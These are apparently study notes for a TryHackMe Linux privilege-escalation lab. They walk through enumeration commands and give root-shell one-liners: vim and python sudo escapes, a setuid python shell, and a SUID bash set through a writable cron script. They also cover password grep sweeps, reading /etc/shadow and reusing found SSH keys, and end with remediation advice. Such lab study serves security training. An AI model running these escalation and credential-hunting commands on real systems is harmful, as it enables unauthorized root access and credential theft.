# 001 Initial Enumeration
Linux PrivEsc Lab - [https://tryhackme.com/room/linuxprivescarena](https://tryhackme.com/room/linuxprivescarena)
TryHackMe - [https://tryhackme.com/](https://tryhackme.com/)

When you land on a box (like your TryHackMe lab), your goal is NOT to run every command.
Your goal is to answer:
- Who am I?
- What can I access?
- What is running?
- What is misconfigured?
- What can I abuse?

Everything you do should map to one of these.

Login to machine as
```
username: TCM  
password: Hacker123
```

`ssh -o HostKeyAlgorithms=+ssh-rsa TCM@10.49.165.229`

### What you're looking for:
- Are you a low-priv user? (likely yes)
- Are you in interesting groups?
    - `sudo`
    - `docker`
    - `lxd`
    - `adm`, `shadow`

### Real-world insight:
If you're in `docker`, you often already have root. Same for `lxd`.

## System Enumeration
```bash
# Search for kernal
uname -a
cat /proc/version
cat /etc/issue
lscpu

# for multiple threads or cores for exploits
```
### Why this matters:
#### Attack Vector: Kernel Exploits
You are checking:
- Kernel version
- Architecture
- Patch level

Example:
Linux target 4.4.0-21-generic

This might be vulnerable to:
- Dirty COW
- OverlayFS bugs

### Real-world workflow:
1. Copy kernel version
2. Search:    
	`searchsploit linux kernel 4.4`
3. Or:    
	`google: "linux kernel 4.4 privilege escalation exploit"`
### Important:
Kernel exploits are:
- Noisy
- Risky (may crash system)
- Last resort in real engagements

# Process & Service Enumeration
`ps aux`
### What you're looking for:
- Services running as **root**
- Custom scripts
- Cron-like processes
- Web servers, databases

Example:
`root     1234  ...  /usr/bin/python3 /opt/backup.py`

### Attack Vector:
- Writable script → privilege escalation
- Weak permissions → code injection
### Hostname
`hostname`

Useful for:
- Internal naming patterns
- Pivoting later

## User Enumeration
```bash
whoami
id # for group and all
sudo -l
```
### Critical step: `sudo -l`
This is one of the **highest success rate vectors**.
Example:
```
User TCM may run the following:  
(root) NOPASSWD: /usr/bin/vim
```
### Attack:
`sudo vim -c '!sh'`
Root shell.
```
# try
sudo su -
```

## Enumerating Users
`cat /etc/passwd`

Look for:
- Real users (UID >= 1000)
- Service accounts
`cat /etc/passwd | cut -d : -f 1`
### Shadow File
`cat /etc/shadow`

If readable → critical finding.
### Attack:
- Extract hashes
- Crack offline using:
    - John
    - Hashcat
### Groups
`cat /etc/group`

Look for:
- `sudo`
- `docker`
- `lxd`
- `adm`
### History
`history`
### Real-world goldmine:
You might find:
`mysql -u root -pSuperSecret123`

Now you have credentials.

## Network Enumeration
```bash
ifconfig
ip a
hostname -I # hostname -i
# looking for different nics, routes
ip route
arp -a
ip neigh
```
### Why this matters:
#### Attack Vector: Pivoting
You might find:
- Internal networks
- Other subnets
Example:
`10.10.10.5 (internal)`

### ports and communication
```
netstat -ano
```
Look for:
- Listening services (127.0.0.1)
- Internal-only services
Example:
`127.0.0.1:3306 (MySQL)`
### Attack:
- Try connecting locally
- Use found credentials
## Password Hunting (High ROI)
```bash
# quicks commmands
grep --color=auto -rnw '/' -ie "*PASS*" --color=alwyays 2>/dev/null
grep --color=auto -rnw '/' -ie "PASSWORD" --color=alwyays 2>/dev/null
grep --color=auto -rnw '/' -ie "PASSWORD=" --color=alwyays 2>/dev/null

locate password | more
locate pass | more


cat /etc/shadow
```

### Target directories:
Focus instead of scanning everything:
```scss
/home/  
/var/www/  
/opt/  
/etc/  
/tmp/
```

# SSH keys hunting
```bash
find / -name authorized_keys
find / -name id_rsa 2>/dev/null
```
### Attack:
If you find:
`/home/user/.ssh/id_rsa`
- Copy it
- SSH as that user

## File Permission Enumeration
This is where many privesc paths exist.
`find / -perm -4000 -type f 2>/dev/null`

### SUID binaries
Look for unusual ones:
- `nano`
- `vim`
- custom binaries
### Writable files
`find / -writable -type f 2>/dev/null`

## Scheduled Tasks
```
crontab -l  
cat /etc/crontab  
ls -la /etc/cron*
```

### Attack vector:
If a script runs as root and is writable:  
→ modify it → get root

## Capabilities
`getcap -r / 2>/dev/null`
### Example:
`/usr/bin/python3 = cap_setuid+ep`

### Attack:
`python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'`

## Automation Tools (Use after manual)
Tools help confirm findings:
- linPEAS
- LinEnum
- pspy (for processes)

But:  
Manual enumeration builds understanding.

# Real-World Attack Flow Example
Let’s simulate:
### Step 1:
`sudo -l`

Output:
`(root) NOPASSWD: /usr/bin/python3`

### Step 2:
Exploit:
`sudo python3 -c 'import os; os.system("/bin/sh")'`

### Result:
`Root shell`

---
### Another Example:
### Step 1:
`ps aux`

Find:
`root /opt/backup.sh`

### Step 2:
`ls -la /opt/backup.sh`

Writable by you.

### Step 3:
Add:
`chmod +s /bin/bash`

### Step 4:
Wait for cron → then:
`/bin/bash -p`

Root shell.

---

# Remediation
For each finding, you must recommend:

### 1. Sudo misconfigurations
- Restrict commands
- Remove NOPASSWD

### 2. Weak file permissions
- Apply least privilege
- Remove world-writable files

### 3. Sensitive data exposure
- Store secrets securely
- Use vaults

### 4. Kernel vulnerabilities
- Patch regularly

### 5. SSH key exposure
- Protect private keys
- Use proper permissions

---

# Professional Tip (OSCP mindset)
Don’t memorize commands. Build this flow:
1. Identity
2. Privileges
3. Services
4. Files
5. Credentials
6. Misconfigurations
7. Exploit path